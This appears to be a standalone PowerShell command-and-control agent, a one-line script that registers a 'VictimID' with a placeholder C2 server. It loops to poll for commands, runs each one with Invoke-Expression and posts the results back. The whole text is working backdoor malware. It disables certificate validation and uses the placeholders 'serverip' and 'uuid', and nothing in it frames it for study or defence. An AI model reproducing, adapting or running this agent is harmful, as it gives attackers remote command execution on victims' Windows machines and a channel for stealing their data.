&{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$C2Server="serverip";$VictimID="uuid";$PollingInterval=5;$response=Invoke-RestMethod -Uri "$C2Server/initialization" -Method Post -Body @{session_name=$VictimID} -UseBasicParsing;while($true){try{$response=Invoke-RestMethod -Uri "$C2Server/poll" -Method Post -Body @{session_name=$VictimID} -UseBasicParsing;if($response -ne ""){try{$result=Invoke-Expression $response|Out-String;Invoke-RestMethod -Uri "$C2Server/result" -Method Post -Body @{session_name=$VictimID;result=$result} -UseBasicParsing}catch{$errorDetails=$_|Out-String;Invoke-RestMethod -Uri "$C2Server/result" -Method Post -Body @{session_name=$VictimID;result=$errorDetails} -UseBasicParsing}}}catch{$errorDetails=$_|Out-String;Invoke-RestMethod -Uri "$C2Server/result" -Method Post -Body @{session_name=$VictimID;result=$errorDetails} -UseBasicParsing}finally{Start-Sleep -Seconds $PollingInterval}}}
